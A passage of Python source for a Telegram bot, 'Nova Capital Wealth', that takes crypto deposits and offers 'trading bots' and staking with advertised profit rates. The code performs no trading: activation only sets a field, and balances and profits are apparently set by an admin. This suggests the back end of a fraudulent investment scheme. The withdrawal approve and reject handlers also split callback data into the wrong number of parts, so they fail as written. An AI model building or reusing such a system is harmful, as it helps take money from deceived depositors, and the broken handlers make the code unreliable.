        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}'),
         InlineKeyboardButton("❌ Reject", callback_data=f'reject_withdrawal_{user_id}_{amount}')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    try:
        await context.bot.send_message(
            chat_id=admin_id,
            text=admin_message,
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    except TelegramError as e:
        logger.error(f"Failed to send admin notification: {e}")
        await update.message.reply_text(
            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
        )
        return MAIN_MENU
        
    user_info['pending_withdrawal'] = amount
    from database import db
    db.save_user(user_id, user_info)
    
    await update.message.reply_text(
        "Your withdrawal request is pending admin confirmation.",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
    )
    return MAIN_MENU

# Bank flow functions removed: get_bank_name

# Bank flow functions removed: get_account_number

# Bank flow functions removed: get_routing_number

async def approve_withdrawal_button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle admin's withdrawal approval via button"""
    query = update.callback_query
    await query.answer()
    
    admin_id = get_admin_id()
    if update.effective_user.id != admin_id:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="❌ Unauthorized access."
        )
        return MAIN_MENU
        
    try:
        _, user_id_str, amount_str = query.data.split('_')
        user_id = int(user_id_str)
        amount = float(amount_str)
        
        user_info = get_user_data(user_id)
        if not user_info or not user_info.get('name'):
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="❌ User not found."
            )
            return MAIN_MENU
        
        # CHECK: Prevent double approval
        if user_info.get('pending_withdrawal', 0) == 0:
            await query.edit_message_text(
                f"{query.message.text}\n\n⚠️ **Already Processed** - This withdrawal has already been approved."
            )
            logger.warning(f"Attempted double approval of withdrawal for user {user_id}")
            return MAIN_MENU
            
        if amount > user_info['balance']:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="❌ Insufficient user balance."
            )
            return MAIN_MENU
            
        user_info['balance'] -= amount
        user_info['withdrawal'] += amount
        user_info['pending_withdrawal'] = 0
        
        from database import db
        db.save_user(user_id, user_info)
        
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"✅ Your withdrawal of ${amount:.2f} has been processed! Your new balance is ${user_info['balance']:.2f}.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
            )
        except TelegramError as e:
            logger.error(f"Failed to notify user {user_id}: {e}")
            
        await query.edit_message_text(
            f"{query.message.text}\n\n✅ **Withdrawal Approved** - ${amount:.2f} deducted from user {user_id}'s balance."
        )
        return MAIN_MENU
        
    except ValueError:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="❌ Invalid format."
        )
        return MAIN_MENU

async def reject_withdrawal_button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle admin's withdrawal rejection via button"""
    query = update.callback_query
    await query.answer()
    
    admin_id = get_admin_id()
    if update.effective_user.id != admin_id:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="❌ Unauthorized access."
        )
        return MAIN_MENU
        
    try:
        _, user_id_str, amount_str = query.data.split('_')
        user_id = int(user_id_str)
        amount = float(amount_str)
        
        user_info = get_user_data(user_id)
        if not user_info or not user_info.get('name'):
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="❌ User not found."
            )
            return MAIN_MENU
        
        # CHECK: Prevent double rejection
        if user_info.get('pending_withdrawal', 0) == 0:
            await query.edit_message_text(
                f"{query.message.text}\n\n⚠️ **Already Processed** - This withdrawal has already been processed."
            )
            logger.warning(f"Attempted double rejection of withdrawal for user {user_id}")
            return MAIN_MENU
            
        # Clear pending withdrawal without changing balance
        user_info['pending_withdrawal'] = 0
        
        from database import db
        db.save_user(user_id, user_info)
        
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"❌ Your withdrawal request of ${amount:.2f} has been rejected by the admin. Please contact support for more information.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
            )
            logger.info(f"Notified user {user_id} of withdrawal rejection for ${amount:.2f}")
        except TelegramError as e:
            logger.error(f"Failed to notify user {user_id}: {e}")
            
        await query.edit_message_text(
            f"{query.message.text}\n\n❌ **Withdrawal Rejected** - User {user_id}'s withdrawal request for ${amount:.2f} has been rejected."
        )
        return MAIN_MENU
        
    except ValueError:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="❌ Invalid format."
        )
        return MAIN_MENU

async def show_trading_bot(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Show trading bot options"""
    user_id = update.effective_user.id
    admin_id = get_admin_id()
    
    if user_id == admin_id:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="Admins cannot access user features."
        )
        return ConversationHandler.END
        
    query = update.callback_query
    await query.answer()
    
    user_info = get_user_data(user_id)
    if user_info['balance'] <= 0:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="⚠️ You need a positive balance to activate a trading bot. Please make a deposit first.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💳 Deposit", callback_data='deposit')],
                [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
            ])
        )
        return MAIN_MENU
    
    keyboard = []
    for bot_name, bot_info in trading_bots.items():
        keyboard.append([InlineKeyboardButton(f"🤖 {bot_name} ({bot_info['profit_rate']}% Profit)", callback_data=f'select_bot_{bot_name}')])
    keyboard.append([InlineKeyboardButton("❌ Cancel", callback_data='cancel')])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="🤖 **Select Trading Bot**\n\nChoose a trading bot to activate its strategy:\n\n⚠️ **Minimum Deposit Required:** $500.00",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )
    return MAIN_MENU

async def select_trading_bot(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle trading bot selection"""
    user_id = update.effective_user.id
    admin_id = get_admin_id()
    
    if user_id == admin_id:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="Admins cannot access user features."
        )
        return ConversationHandler.END
        
    query = update.callback_query
    await query.answer()
    
    bot_name = query.data.replace('select_bot_', '')
    user_info = get_user_data(user_id)
    
    # Check minimum deposit requirement of $500
    MINIMUM_DEPOSIT = 500.00
    
    if user_info['balance'] < MINIMUM_DEPOSIT:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"⚠️ **Insufficient Balance**\n\nYou need at least **${MINIMUM_DEPOSIT:.2f}** to activate a trading bot.\n\n💰 **Your Balance:** ${user_info['balance']:.2f}\n💳 **Required:** ${MINIMUM_DEPOSIT:.2f}\n\nPlease make a deposit to continue.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💳 Deposit Now", callback_data='deposit')],
                [InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]
            ]),
            parse_mode='Markdown'
        )
        return MAIN_MENU
    
    if user_info['active_bot'] == bot_name:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"You are already using {bot_name}. Please wait while it generates profits.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
        )
    else:
        user_info['active_bot'] = bot_name
        from database import db
        db.save_user(user_id, user_info)
        
        profit_rate = trading_bots[bot_name]['profit_rate']
        description = trading_bots[bot_name]['description']
        message = f"""✅ **{bot_name} Activated!**

📋 **Description:** {description}
📈 **Expected Profit Rate:** {profit_rate}% per cycle
🚀 Your trading bot is now active, leveraging advanced algorithms to maximize your returns. Monitor your progress in the main menu."""
        
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=message,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]]),
            parse_mode='Markdown'
        )
        
        admin_message = f"""🤖 **Trading Bot Activated**

👤 **User:** {user_info['name']} (ID: {user_id})
🤖 **Bot:** {bot_name}
📈 **Profit Rate:** {profit_rate}%"""
        try:
            await context.bot.send_message(
                chat_id=admin_id,
                text=admin_message,
                parse_mode='Markdown'
            )
        except TelegramError as e:
            logger.error(f"Failed to notify admin about bot activation for user {user_id}: {e}")
    
    return MAIN_MENU

async def handle_stake(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Show staking dashboard"""
    user_id = update.effective_user.id
    admin_id = get_admin_id()
    
    if user_id == admin_id:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="Admins cannot access user features."
        )
        return ConversationHandler.END
        
    query = update.callback_query
    await query.answer()
    
    user_info = get_user_data(user_id)
    staked_balance = user_info.get('staked_balance', 0.0)
    locked_balance = user_info.get('locked_stake_balance', 0.0)
    total_balance = user_info.get('balance', 0.0)
    available = total_balance - locked_balance
    if available < 0:
        available = 0.0
    
    keyboard = []
    
    # Always show deposit option
    keyboard.append([InlineKeyboardButton("💳 Deposit to Stake", callback_data='stake_deposit')])
    
    if staked_balance <= 0 and locked_balance <= 0:
        message = """🎯 **Staking Dashboard**

💰 **Available Balance:** $0.00
🎯 **Staking Balance:** $0.00
🔒 **Locked Stake:** $0.00

You haven't started staking yet! Deposit funds to your staking balance to start earning rewards.

🚀 **Why Stake?**
• Earn passive income
• Flexible & Fixed options
• Top-tier security"""
    elif staked_balance <= 0:
        message = f"""🎯 **Staking Dashboard**

💰 **Available Balance:** ${available:.2f}
🎯 **Staking Balance:** $0.00
🔒 **Locked Stake:** ${locked_balance:.2f}

All your staking funds are currently locked. Deposit more to start a new stake."""
    else:
        message = f"""🎯 **Staking Dashboard**

💰 **Available Balance:** ${available:.2f}
🎯 **Staking Balance:** ${staked_balance:.2f}
🔒 **Locked Stake:** ${locked_balance:.2f}"""
        keyboard.append([InlineKeyboardButton("🚀 Start New Stake", callback_data='start_staking')])
    
    keyboard.append([InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=message,
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )
    return MAIN_MENU

# Staking Configuration
STAKING_COINS = [
    'BTC', 'ETH', 'USDT', 'BNB', 'SOL', 'XRP', 'USDC', 
    'ADA', 'AVAX', 'DOGE', 'DOT', 'TRX', 'LINK'
]

async def stake_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle deposit specifically for staking - uses normal deposit flow but tagged"""
    query = update.callback_query
    await query.answer()
    
    # Tag this deposit as staking so admin and confirmation know
    context.user_data['deposit_purpose'] = 'staking'
    
    keyboard = [
        [InlineKeyboardButton("₿ Crypto", callback_data='deposit_crypto')],
        [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="🎯 **Deposit to Stake**\n\nChoose your preferred deposit method:",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )
    return MAIN_MENU

async def start_staking(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Start staking flow - check balance first, then show coins"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    user_info = get_user_data(user_id)
    staked_balance = user_info.get('staked_balance', 0.0)
    
    if staked_balance <= 0:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="⚠️ **Insufficient Staking Balance**\n\nYou need to deposit funds to your staking balance first.\n\nUse 'Deposit to Stake' to add funds.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💳 Deposit to Stake", callback_data='stake_deposit')],
                [InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]
            ]),
            parse_mode='Markdown'
        )
        return MAIN_MENU
    
    keyboard = []
    row = []
    for coin in STAKING_COINS:
        row.append(InlineKeyboardButton(coin, callback_data=f'stake_coin_{coin}'))
        if len(row) == 3:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)
    
    keyboard.append([InlineKeyboardButton("❌ Cancel", callback_data='cancel')])
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"💎 **Select Asset to Stake**\n\n🎯 Staking Balance: ${staked_balance:.2f}\n\nChoose from our premium selection of supported cryptocurrencies:",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )
    return MAIN_MENU

async def select_staking_coin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle coin selection - ask for amount next"""
    query = update.callback_query
    await query.answer()
    
    coin = query.data.split('_')[-1]
    context.user_data['staking_coin'] = coin
    
    user_id = update.effective_user.id
    user_info = get_user_data(user_id)
    staked_balance = user_info.get('staked_balance', 0.0)
    
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"💰 **Enter Staking Amount for {coin}**\n\n🎯 Staking Balance: ${staked_balance:.2f}\n\nEnter the amount you want to stake (in USD):",
        reply_markup=create_cancel_keyboard(),
        parse_mode='Markdown'
    )
    return STAKING_AMOUNT

async def get_staking_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Process staking amount - then ask for duration"""
    user_id = update.effective_user.id
    
    try:
        amount = float(update.message.text)
        if amount <= 0:
            raise ValueError("Amount must be positive")
            
        user_info = get_user_data(user_id)
        staked_balance = user_info.get('staked_balance', 0.0)
        
        if amount > staked_balance:
            await update.message.reply_text(
                f"⚠️ **Insufficient Staking Balance**\n\n🎯 Staking Balance: ${staked_balance:.2f}\nRequired: ${amount:.2f}\n\nPlease deposit more funds to your staking balance.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("💳 Deposit to Stake", callback_data='stake_deposit')],
                    [InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]
                ]),
                parse_mode='Markdown'
            )
            return MAIN_MENU
        
        # Store amount and ask for duration
        context.user_data['staking_amount'] = amount
        
        keyboard = [
            [InlineKeyboardButton("30 Days", callback_data='stake_duration_30')],
            [InlineKeyboardButton("60 Days", callback_data='stake_duration_60')],
            [InlineKeyboardButton("90 Days", callback_data='stake_duration_90')],
            [InlineKeyboardButton("Flexible (No Lock)", callback_data='stake_duration_flex')],
            [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"⏳ **Select Staking Duration**\n\n💎 Asset: {context.user_data['staking_coin']}\n💰 Amount: ${amount:.2f}\n\nChoose how long you want to stake:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        return MAIN_MENU
        
    except ValueError:
        await update.message.reply_text("Please enter a valid numeric amount (e.g. 100).")
        return STAKING_AMOUNT

async def select_staking_duration(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle duration selection - then ask for plan type (fixed/flexible)"""
    query = update.callback_query
    await query.answer()
    
    duration_raw = query.data.split('_')[-1]
    
    if duration_raw == 'flex':
        context.user_data['staking_duration'] = 'Flexible'
        # Flexible means flexible plan automatically
        context.user_data['staking_plan'] = 'flexible'
        # Go straight to confirmation
        return await finalize_stake(update, context)
    else:
        context.user_data['staking_duration'] = f"{duration_raw} Days"
        
        keyboard = [
            [InlineKeyboardButton("🔒 Fixed Staking", callback_data='stake_plan_fixed')],
            [InlineKeyboardButton("🔓 Flexible Staking", callback_data='stake_plan_flexible')],
            [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        coin = context.user_data.get('staking_coin', 'N/A')
        amount = context.user_data.get('staking_amount', 0)
        duration = context.user_data.get('staking_duration', 'N/A')
        
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"""📋 **Select Staking Type**

💎 Asset: {coin}
💰 Amount: ${amount:.2f}
⏳ Duration: {duration}

**🔒 Fixed Staking**
• Funds locked for the duration
• Higher rewards

**🔓 Flexible Staking**
• Withdraw anytime
• Standard rewards""",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        return MAIN_MENU

async def select_staking_plan(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle plan type selection and finalize the stake"""
    query = update.callback_query
    await query.answer()
    
    plan_type = query.data.split('_')[-1]  # fixed or flexible
    context.user_data['staking_plan'] = plan_type
    
    return await finalize_stake(update, context)

async def finalize_stake(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Execute the stake - lock funds and save"""
    user_id = update.effective_user.id
    user_info = get_user_data(user_id)
    
    coin = context.user_data.get('staking_coin', 'N/A')
    amount = context.user_data.get('staking_amount', 0)
    plan = context.user_data.get('staking_plan', 'flexible')
    duration = context.user_data.get('staking_duration', 'Flexible')
    
    staked_balance = user_info.get('staked_balance', 0.0)
    
    # Final staking balance check
    if amount > staked_balance:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"⚠️ **Insufficient Staking Balance**\n\n🎯 Staking Balance: ${staked_balance:.2f}\nRequired: ${amount:.2f}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]]),
            parse_mode='Markdown'
        )
        return MAIN_MENU
    
    # Execute Stake - deduct from staked_balance and add to locked_stake_balance
    user_info['staked_balance'] = staked_balance - amount
    user_info['locked_stake_balance'] = user_info.get('locked_stake_balance', 0.0) + amount
    
    new_stake = {
        'coin': coin,
        'amount': amount,
        'plan': plan,
        'duration': duration,
        'status': 'Active'
    }
    
    stakes = user_info.get('active_stakes', [])
    stakes.append(new_stake)
    user_info['active_stakes'] = stakes
    
    from database import db
    db.save_user(user_id, user_info)
    
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"""🎉 **Congratulations! You have successfully staked!**

💎 **Asset:** {coin}
💰 **Amount Locked:** ${amount:.2f}
📋 **Plan:** {plan.title()}
⏳ **Duration:** {duration}
📊 **Status:** Active

🎯 **Remaining Staking Balance:** ${user_info['staked_balance']:.2f}
🔒 **Total Locked:** ${user_info['locked_stake_balance']:.2f}

Your funds are now locked and earning rewards!""",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🎯 Staking Dashboard", callback_data='stake')],
            [InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]
        ]),
        parse_mode='Markdown'
    )
    return MAIN_MENU

async def visit_website(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle website visit"""
    user_id = update.effective_user.id
    admin_id = get_admin_id()
    
    if user_id == admin_id:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="Admins cannot access user features."
        )
        return ConversationHandler.END
        
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("🌐 Visit Nova Capital Wealth", url='https://novacapitalwealthpro.com')],
        [InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="🌐 **Visit Our Website**\n\nClick the button below to access your trading account:",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )
    return MAIN_MENU

async def refresh_balance(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Refresh and show updated balance"""
    user_id = update.effective_user.id
    admin_id = get_admin_id()
    
    if user_id == admin_id:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="Admins cannot access user features."
        )
        return ConversationHandler.END
        
    query = update.callback_query
    await query.answer("Balance refreshed! 🔄")
    
    user_info = get_user_data(user_id)
    
    menu_text = f"""🎉 **Welcome, {user_info['name']}!** 🎉

💰 **Available Balance:** ${user_info['balance']:.2f}
📈 **Deposit:** ${user_info['deposit']:.2f}
📊 **Profit:** ${user_info['profit']:.2f}
📉 **Withdrawal:** ${user_info['withdrawal']:.2f}"""
    
    keyboard = [
        [InlineKeyboardButton("💳 Deposit", callback_data='deposit'),
         InlineKeyboardButton("💸 Withdraw", callback_data='withdraw')],
        [InlineKeyboardButton("🤖 Trading Bot", callback_data='trading_bot'),
         InlineKeyboardButton("🎯 Stake", callback_data='stake')],
        [InlineKeyboardButton("🔄 Refresh Balance", callback_data='refresh_balance'),
         InlineKeyboardButton("🌐 Visit Website", callback_data='visit_website')],
        [InlineKeyboardButton("💬 Contact Support", url='https://t.me/ncwtradingbotsupport')],
        [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    try:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=menu_text,
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    except TelegramError as e:
        logger.error(f"Failed to send refresh balance message: {e}")
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="⚠️ Failed to refresh balance. Please try again or contact support.",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    return MAIN_MENU

async def cancel_operation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancel current operation"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    user_info = get_user_data(user_id)
    # Clear any awaiting action flags to avoid being stuck
    for key in [
        'awaiting_deposit_amount', 'awaiting_deposit_proof', 'awaiting_withdraw_amount',
        'awaiting_withdraw_crypto_address',
        'selected_crypto', 'deposit_amount', 'withdraw_amount', 'bank_name', 'crypto_address', 'account_number', 'routing_number'
    ]:
        context.user_data.pop(key, None)
    # Clear conversation state if set in application-level user_data
    try:
        app_user_data = context.application.dispatcher.user_data
        if isinstance(app_user_data, dict) and user_id in app_user_data:
            app_user_data[user_id].pop('conversation_state', None)
            app_user_data[user_id].pop('_in_conversation', None)
    except Exception:
        # no-op if dispatcher user_data isn't accessible
        pass
    
    if user_info['name'] and user_info['email'] and user_info['phone']:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="❌ Operation cancelled. Returning to main menu."
        )
        return await show_main_menu(update, context)
    
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="❌ Operation cancelled. Use /start to begin again."
    )
    return ConversationHandler.END

async def get_id(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Get user's Telegram ID"""
    user_id = update.effective_user.id
    admin_id = get_admin_id()
    
    if user_id == admin_id:
        await update.message.reply_text("Admins cannot access user features.")
        return
        
    await update.message.reply_text(f"Your User ID is: {user_id}")


async def top_level_text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Fallback text handler for users not in ConversationHandler.
    It routes incoming text messages (for example, deposit amount or withdraw flow) to the proper handlers
    based on flags set in context.user_data (e.g., 'awaiting_deposit_amount').
    """
    # Prioritize deposit/withdraw flows for users who used the top-level menu
    if context.user_data.get('awaiting_deposit_amount'):
        await get_deposit_amount(update, context)
        return
    if context.user_data.get('awaiting_deposit_proof'):
        # They shouldn't send text, but clear state and inform them
        await update.message.reply_text("⚠️ Please send a photo as proof of payment.")
        return
    if context.user_data.get('awaiting_withdraw_amount'):
        await get_withdraw_amount(update, context)
        return
    if context.user_data.get('awaiting_withdraw_crypto_address'):
        await get_crypto_address(update, context)
        return

    # Not expecting any special text - ignore or notify user
    logger.info("Received text outside conversation and no pending action for user %s", update.effective_user.id)
    # optional: ask user to click a button or /start
    await update.message.reply_text("Please use the main menu. Click 'START NOW' or type /start to begin.")


async def top_level_photo_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Fallback photo handler for users not in ConversationHandler. Used for deposit proofs."""
    if context.user_data.get('awaiting_deposit_proof'):
        await get_deposit_proof(update, context)
        return

    logger.info("Received photo outside conversation and no deposit proof expected for user %s", update.effective_user.id)
    await update.message.reply_text("No action is expecting a photo right now. If you intended to send a payment proof, go to 'Deposit' from the main menu.")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle errors"""
    logger.error(f"Update {update} caused error {context.error}")
    
    if update and update.effective_message:
        await update.effective_message.reply_text(
            "⚠️ An error occurred. Please try again or contact support if the problem persists."
        )

def main() -> None:
    """Start the bot and send admin panel"""
    keep_alive()
    application = Application.builder().token(BOT_TOKEN).build()
    
    from admin import (
        send_admin_panel, admin_panel, handle_admin_action,
        approve_deposit, approve_withdrawal, reject_withdrawal, update_profit,
        update_crypto_address, list_users, admin_help, send_login,
        approve_pending_user, cancel_admin_action, update_stake, update_locked_stake
    )
    
    admin_id = get_admin_id()
    if admin_id:
        application.bot_data['admin_id'] = admin_id
        application.job_queue.run_once(send_admin_panel, 1, data={'admin_id': admin_id})
    else:
        logger.warning("ADMIN_USER_ID not set, admin panel will not be sent.")
    
    # Register admin callback handlers FIRST (these should work globally)
    application.add_handler(CallbackQueryHandler(approve_pending_user, pattern='^approve_pending_user_'))
    application.add_handler(CallbackQueryHandler(cancel_admin_action, pattern='^cancel_admin_action$'))
    application.add_handler(CallbackQueryHandler(approve_new_user_button, pattern='^approve_new_user_'))
    application.add_handler(CallbackQueryHandler(handle_admin_action, pattern='^admin_'))
    application.add_handler(CallbackQueryHandler(handle_deposit_confirmation, pattern='^confirm_deposit_'))
    application.add_handler(CallbackQueryHandler(approve_withdrawal_button, pattern='^approve_withdrawal_'))
    application.add_handler(CallbackQueryHandler(reject_withdrawal_button, pattern='^reject_withdrawal_'))
    
    # CONVERSATION HANDLER - This should be registered AFTER admin handlers but BEFORE other handlers
    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler("start", start),
            CallbackQueryHandler(stake_deposit, pattern='^stake_deposit$'), # Staking entry
            CallbackQueryHandler(start_staking, pattern='^start_staking$'), # Staking entry
            CallbackQueryHandler(handle_stake, pattern='^stake$'), # Dashboard entry
            # Also add main menu buttons so users can "re-enter" flow if bot restarted
            CallbackQueryHandler(handle_deposit, pattern='^deposit$'),
            CallbackQueryHandler(handle_withdrawal, pattern='^withdraw$'),
            CallbackQueryHandler(show_trading_bot, pattern='^trading_bot$'),
            CallbackQueryHandler(refresh_balance, pattern='^refresh_balance$'),
        ],
        states={
            WAITING_NAME: [
                CallbackQueryHandler(start_registration, pattern='^start_registration$'),
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_name),
                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
            ],
            WAITING_EMAIL: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_email),
                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
            ],
            WAITING_PHONE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone),
                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
            ],
            MAIN_MENU: [
                CallbackQueryHandler(back_to_menu, pattern='^back_to_menu$'),
                CallbackQueryHandler(refresh_balance, pattern='^refresh_balance$'),
                CallbackQueryHandler(visit_website, pattern='^visit_website$'),
                CallbackQueryHandler(handle_deposit, pattern='^deposit$'),
                CallbackQueryHandler(show_crypto_options, pattern='^deposit_crypto$'),
                CallbackQueryHandler(handle_crypto_selection, pattern='^crypto_select_'),
                CallbackQueryHandler(handle_withdrawal, pattern='^withdraw$'),
                    CallbackQueryHandler(show_withdraw_crypto_options, pattern='^withdraw_crypto$'),
                    CallbackQueryHandler(handle_withdraw_crypto_select, pattern='^withdraw_select_'),
                CallbackQueryHandler(show_trading_bot, pattern='^trading_bot$'),
                CallbackQueryHandler(select_trading_bot, pattern='^select_bot_'),
                CallbackQueryHandler(handle_stake, pattern='^stake$'),
                CallbackQueryHandler(stake_deposit, pattern='^stake_deposit$'),
                CallbackQueryHandler(start_staking, pattern='^start_staking$'),
                CallbackQueryHandler(select_staking_coin, pattern='^stake_coin_'),
                CallbackQueryHandler(select_staking_plan, pattern='^stake_plan_'),
                CallbackQueryHandler(select_staking_duration, pattern='^stake_duration_'),
                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
            ],
            DEPOSIT_AMOUNT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_deposit_amount),
                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
            ],
            DEPOSIT_PROOF: [
                MessageHandler(filters.PHOTO, get_deposit_proof),
                CallbackQueryHandler(copy_address, pattern='^copy_address_'),
                CallbackQueryHandler(payment_made, pattern='^payment_made$'),
                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
            ],
            WITHDRAW_AMOUNT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_withdraw_amount),
                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
            ],
            WITHDRAW_CRYPTO_ADDRESS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_crypto_address),
                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
            ],
            STAKING_AMOUNT: [
                 MessageHandler(filters.TEXT & ~filters.COMMAND, get_staking_amount),
                 CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
            ],
            # Bank withdrawal states removed
        },
        fallbacks=[CommandHandler("start", start)],
        per_message=False
    )
    
    # Add the conversation handler
    application.add_handler(conv_handler)
    
    # Add top-level handlers for main menu callbacks so they still work
    # for users who don't have an active ConversationHandler state (e.g. newly approved users)
    # These are added AFTER the conversation handler so they only run when conv handler doesn't
    # handle the callback (i.e., user not currently in a conversation).
    application.add_handler(CallbackQueryHandler(back_to_menu, pattern='^back_to_menu$'))
    application.add_handler(CallbackQueryHandler(refresh_balance, pattern='^refresh_balance$'))
    application.add_handler(CallbackQueryHandler(visit_website, pattern='^visit_website$'))
    application.add_handler(CallbackQueryHandler(handle_deposit, pattern='^deposit$'))
    application.add_handler(CallbackQueryHandler(show_crypto_options, pattern='^deposit_crypto$'))
